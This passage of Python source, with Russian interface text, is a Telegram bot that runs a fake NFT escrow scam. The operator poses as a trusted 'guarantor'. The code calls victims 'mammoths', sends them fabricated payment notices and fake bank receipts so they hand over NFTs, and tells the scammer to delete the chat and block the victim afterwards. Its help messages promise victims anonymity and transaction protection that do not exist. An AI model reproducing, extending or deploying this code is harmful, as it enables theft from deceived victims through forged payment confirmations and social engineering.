            answer_callback_query(query_id, "❌ Вы не гарант этой сделки", show_alert=True)
            return
        
        if deal['status'] != 'waiting':
            answer_callback_query(query_id, "❌ Сделка уже " + deal['status'], show_alert=True)
            return
        
        result = confirm_deal(deal_id, 'scammer')
        
        if result == 'completed':
            scammer_msg = (
                "🎉 <b>СДЕЛКА #" + deal_id + " ЗАВЕРШЕНА!</b>\n\n"
                "✅ Получатель подтвердил отправку NFT\n"
                "✅ Вы подтвердили отправку денег\n\n"
                "💰 Сумма: " + format_price(deal['price']) + "\n"
                "🎨 NFT получено: " + deal['gift_link'] + "\n\n"
                "⏳ Операция завершена успешно"
            )
            send_message(user_id, scammer_msg)
            
            if deal['mammoth_id']:
                mammoth_msg = (
                    "🎉 <b>СДЕЛКА #" + deal_id + " ЗАВЕРШЕНА!</b>\n\n"
                    "✅ Вы подтвердили отправку NFT\n"
                    "✅ Гарант подтвердил отправку денег\n\n"
                    "💰 Сумма: " + format_price(deal['price']) + "\n"
                    "💸 Деньги отправлены на вашу карту\n\n"
                    "⏳ Операция завершена успешно"
                )
                send_message(deal['mammoth_id'], mammoth_msg)
            
            answer_callback_query(query_id, "✅ Сделка завершена!", show_alert=True)
        elif result == 'partial':
            scammer_msg = (
                "✅ <b>ВЫ ПОДТВЕРДИЛИ ОТПРАВКУ ДЕНЕГ</b>\n\n"
                "Сделка: <code>" + deal_id + "</code>\n\n"
                "⏳ Ожидайте подтверждения от получателя"
            )
            send_message(user_id, scammer_msg)
            answer_callback_query(query_id, "✅ Вы подтвердили отправку денег. Ожидайте подтверждения получателя.", show_alert=True)
        else:
            answer_callback_query(query_id, "❌ Ошибка подтверждения", show_alert=True)
    
    def handle_mammoth_confirm(self, query_id, deal_id, user_id):
        deal = get_deal(deal_id)
        
        if not deal:
            answer_callback_query(query_id, "❌ Сделка не найдена", show_alert=True)
            return
        
        if user_id != deal['mammoth_id']:
            answer_callback_query(query_id, "❌ Вы не получатель этой сделки", show_alert=True)
            return
        
        if deal['status'] != 'waiting':
            answer_callback_query(query_id, "❌ Сделка уже " + deal['status'], show_alert=True)
            return
        
        result = confirm_deal(deal_id, 'mammoth')
        
        if result == 'completed':
            mammoth_msg = (
                "🎉 <b>СДЕЛКА #" + deal_id + " ЗАВЕРШЕНА!</b>\n\n"
                "✅ Вы подтвердили отправку NFT\n"
                "✅ Гарант подтвердил отправку денег\n\n"
                "💰 Сумма: " + format_price(deal['price']) + "\n"
                "💸 Деньги отправлены на вашу карту (Придут в течение 30 минут)\n\n"
                "⏳ Операция завершена успешно"
            )
            send_message(user_id, mammoth_msg)
            
            scammer_msg = (
                "🎉 <b>СДЕЛКА #" + deal_id + " ЗАВЕРШЕНА!</b>\n\n"
                "✅ Получатель подтвердил отправку NFT\n"
                "✅ Вы подтвердили отправку денег\n\n"
                "💰 Сумма: " + format_price(deal['price']) + "\n"
                "🎨 NFT получено: " + deal['gift_link'] + "\n\n"
                "⏳ Операция завершена успешно, не забудьте удалить чат и заблокировать мамонта по истечении 20 минут"
            )
            send_message(deal['scammer_id'], scammer_msg)
            
            answer_callback_query(query_id, "✅ Сделка завершена!", show_alert=True)
        elif result == 'partial':
            mammoth_msg = (
                "✅ <b>ВЫ ПОДТВЕРДИЛИ ОТПРАВКУ NFT</b>\n\n"
                "Сделка: <code>" + deal_id + "</code>\n\n"
                "⏳ Ожидайте подтверждения от гаранта"
            )
            send_message(user_id, mammoth_msg)
            answer_callback_query(query_id, "✅ Вы подтвердили отправку NFT. Ожидайте подтверждения гаранта.", show_alert=True)
        else:
            answer_callback_query(query_id, "❌ Ошибка подтверждения", show_alert=True)
    
    def handle_fake_payment(self, query_id, deal_id, user_id):
        deal = get_deal(deal_id)
        
        if not deal:
            answer_callback_query(query_id, "❌ Сделка не найдена", show_alert=True)
            return
        
        if user_id != deal['scammer_id']:
            answer_callback_query(query_id, "❌ Вы не гарант этой сделки", show_alert=True)
            return
        
        if not deal.get('mammoth_id'):
            answer_callback_query(query_id, "❌ Получатель еще не присоединился к сделке", show_alert=True)
            return
        
        if deal.get('fake_payment_sent', 0) == 1:
            answer_callback_query(query_id, "❌ Фейк платеж уже был отправлен", show_alert=True)
            return
        
        fake_receipt = generate_fake_bank_receipt(deal)
        
        mammoth_chat_id = deal['mammoth_id']
        
        mammoth_message = (
            "💸 <b>ПЛАТЕЖ ПОЛУЧЕН!</b>\n\n"
            "✅ <b>Сделка #" + deal_id + " оплачена!</b>\n\n"
            "💰 <b>Сумма:</b> " + format_price(deal['price']) + "\n"
            "💳 <b>На вашу карту:</b> •••• " + re.sub(r'\D', '', str(deal['mammoth_card']))[-4:] + "\n\n"
            "⏳ <b>До зачисления:</b> 15-30 минут\n\n"
            "<i>Деньги успешно отправлены. Проверьте баланс через некоторое время.</i>"
        )
        
        send_message(mammoth_chat_id, mammoth_message)
        send_message(mammoth_chat_id, fake_receipt)
        
        set_fake_payment_sent(deal_id)
        
        scammer_message = (
            "✅ <b>ФЕЙК ПЛАТЕЖ ОТПРАВЛЕН</b>\n\n"
            "Получателю отправлено уведомление об оплате\n"
            "Сделка: <code>" + deal_id + "</code>\n"
            "Сумма: " + format_price(deal['price']) + "\n\n"
            "💡 Теперь получатель думает, что деньги отправлены"
        )
        
        send_message(user_id, scammer_message)
        answer_callback_query(query_id, "✅ Фейк платеж успешно отправлен получателю", show_alert=False)
        
        print_success("Фейк платеж отправлен мамонту " + str(mammoth_chat_id) + " для сделки " + deal_id)
    
    def handle_offers(self, chat_id):
        try:
            conn = sqlite3.connect("deals.db", check_same_thread=False)
            cursor = conn.cursor()
            
            cursor.execute('SELECT id, price, gift_link, status, created_at, mammoth_id FROM deals ORDER BY created_at DESC LIMIT 10')
            deals = cursor.fetchall()
            conn.close()
            
            if not deals:
                message = "📭 Нет активных сделок\n\n💡 Создайте сделку с помощью /skamoffers"
                send_message(chat_id, message)
                return
            
            message = "📊 <b>ПОСЛЕДНИЕ СДЕЛКИ</b>\n\n"
            
            for i, deal in enumerate(deals, 1):
                deal_id, price, gift_link, status, created_at, mammoth_id = deal
                
                status_emoji = {
                    'active': '🟢',
                    'waiting': '🟡',
                    'completed': '✅',
                    'cancelled': '❌'
                }.get(status, '❓')
                
                has_mammoth = "👤" if mammoth_id else "⏳"
                
                message += (
                    str(i) + ". <b>Сделка #" + deal_id + "</b> " + status_emoji + "\n"
                    "   ├ Сумма: " + format_price(price) + "\n"
                    "   ├ NFT: " + gift_link[:30] + "...\n"
                    "   ├ Статус: " + status + "\n"
                    "   └ Получатель: " + has_mammoth + "\n\n"
                )
            
            message += "💡 Всего сделок: " + str(len(deals))
            send_message(chat_id, message)
            
        except Exception as e:
            print_error("Ошибка получения списка сделок: " + str(e))
            send_message(chat_id, "❌ Ошибка получения списка сделок")
    
    def handle_get_link(self, chat_id, user_id):
        if not self.bot_username:
            send_message(chat_id, "❌ Не удалось получить username бота")
            return
        
        example_id = generate_deal_id()
        link = "https://t.me/" + self.bot_username + "?start=" + example_id
        
        message = (
            "🔗 <b>ССЫЛКА ДЛЯ ПОЛУЧАТЕЛЯ</b>\n\n"
            "<code>" + link + "</code>\n\n"
            "<b>Как использовать:</b>\n"
            "1. Создайте сделку (/skamoffers)\n"
            "2. Получите уникальную ссылку\n"
            "3. Отправьте ссылку получателю\n\n"
            "💡 Каждая сделка имеет уникальную ссылку"
        )
        send_message(chat_id, message)
    
    def handle_help(self, chat_id, user_id):
        is_admin_user = is_admin(user_id)
        
        if is_admin_user:
            message = (
                "🆘 <b>ПОМОЩЬ ДЛЯ ГАРАНТА</b>\n\n"
                "<b>📋 КОМАНДЫ:</b>\n"
                "• /skamoffers - Создать сделку\n"
                "• /create - Быстрое создание\n"
                "• /offers - Активные сделки\n"
                "• /link - Получить ссылку\n"
                "• /status - Статус бота\n"
                "• /help - Эта справка\n\n"
                "<b>📝 ПРОЦЕСС:</b>\n"
                "1. Создайте сделку (вы отправляете деньги)\n"
                "2. Отправьте ссылку получателю\n"
                "3. Получатель отправляет NFT и подтверждает\n"
                "4. Вы отправляете деньги и подтверждаете\n\n"
                "<b>🆕 НОВЫЕ ФУНКЦИИ:</b>\n"
                "• 💸 Фейк платеж - отправляет мамонту уведомление об оплате\n\n"
                "<b>⚠️ ВНИМАНИЕ:</b>\n"
                "• Бот не хранит средства\n"
                "• Все подтверждения через кнопки\n"
                "• Проверяйте данные перед отправкой"
            )
        else:
            message = (
                "🆘 <b>ПОМОЩЬ ДЛЯ ПОЛУЧАТЕЛЯ</b>\n\n"
                "<b>📋 КАК РАБОТАТЬ:</b>\n"
                "1. Получите ссылку от гаранта\n"
                "2. Перейдите по ссылке\n"
                "3. Отправьте NFT гаранту\n"
                "4. Подтвердите отправку NFT\n"
                "5. Ожидайте подтверждения от гаранта\n\n"
                "<b>🛡️ ГАРАНТИИ:</b>\n"
                "• Анонимность\n"
                "• Защита транзакций\n"
                "• Автоматическое подтверждение\n\n"
                "<b>⚠️ ВНИМАНИЕ:</b>\n"
                "• Отправляйте NFT только по официальной ссылке\n"
                "• Проверяйте сумму и карту получателя\n"
                "• Не делитесь ссылкой с другими"
            )
        
        send_message(chat_id, message)
    
    def handle_status(self, chat_id):
        try:
            conn = sqlite3.connect("deals.db", check_same_thread=False)
            cursor = conn.cursor()
            
            cursor.execute('SELECT COUNT(*) FROM deals')
            total_deals = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM deals WHERE status = "active"')
            active_deals = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM deals WHERE status = "completed"')
            completed_deals = cursor.fetchone()[0]
            
            cursor.execute("PRAGMA table_info(deals)")
            columns = [column[1] for column in cursor.fetchall()]
            
            if 'fake_payment_sent' in columns:
                cursor.execute('SELECT COUNT(*) FROM deals WHERE fake_payment_sent = 1')
                fake_payments = cursor.fetchone()[0]
            else:
                fake_payments = 0
            
            conn.close()
            
            message = (
                "📊 <b>СТАТУС БОТА</b>\n\n"
                "🤖 Бот: @" + self.bot_username + "\n"
                "🔄 Обновление ID: " + str(self.last_update_id) + "\n"
                "👥 Пользователей в памяти: " + str(len(self.user_states)) + "\n\n"
                "📈 <b>СТАТИСТИКА СДЕЛОК:</b>\n"
                "├ Всего сделок: " + str(total_deals) + "\n"
                "├ Активных: " + str(active_deals) + "\n"
                "├ Завершенных: " + str(completed_deals) + "\n"
                "├ Фейк платежей: " + str(fake_payments) + "\n"
                "└ В процессе: " + str(total_deals - active_deals - completed_deals) + "\n\n"
                "⏰ Время работы: " + datetime.now().strftime('%H:%M:%S')
            )
            
            send_message(chat_id, message)
        except Exception as e:
            print_error("Ошибка получения статуса: " + str(e))
            send_message(chat_id, "❌ Ошибка получения статуса")
    
    def handle_unknown_command(self, chat_id, user_id):
        message = (
            "❓ <b>Неизвестная команда</b>\n\n"
            "Используйте /start для начала работы.\n"
            "Если вы ожидаете получение NFT, попросите у отправителя ссылку.\n\n"
            "Для гарантов доступны команды:\n"
            "/skamoffers - создать сделку\n"
            "/help - помощь"
        )
        send_message(chat_id, message)

# ==================== ЗАПУСК БОТА ====================
def main():
    print_header("ЗАПУСК NFT GARANT BOT")
    
    try:
        bot = NFTBot()
        bot.start_polling()
    except Exception as e:
        print_error("Критическая ошибка: " + str(e))
        traceback.print_exc()
        print_warning("Перезапуск через 10 секунд...")
        time.sleep(10)
        main()

if __name__ == "__main__":
    main()